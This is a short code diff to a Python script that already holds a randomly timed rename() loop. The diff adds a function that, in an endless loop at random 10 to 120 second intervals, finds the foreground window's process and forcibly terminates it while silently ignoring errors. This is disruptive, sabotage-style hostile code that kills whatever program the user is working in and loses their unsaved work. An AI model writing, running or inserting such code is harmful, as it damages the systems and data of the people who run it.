@@ -3,6 +3,10 @@ import subprocess
 import time
 import random
 import glob
+import win32gui
+import ctypes
+import win32con
+
 
 def rename():
 
@@ -31,3 +35,20 @@ def rename():
             except:
                 continue
         time.sleep(random.randint(300, 3600))
+
+def closeactivewindow():
+
+    while True:
+        try:
+            time.sleep(random.randint(10, 120))
+            hwnd = win32gui.GetForegroundWindow()
+            title = win32gui.GetWindowText(hwnd)
+            pid = ctypes.c_ulong()
+            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+            handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_TERMINATE, False, pid.value)
+            ctypes.windll.kernel32.TerminateProcess(handle, 0)
+            ctypes.windll.kernel32.CloseHandle(handle)
+        except:
+            continue
+
+
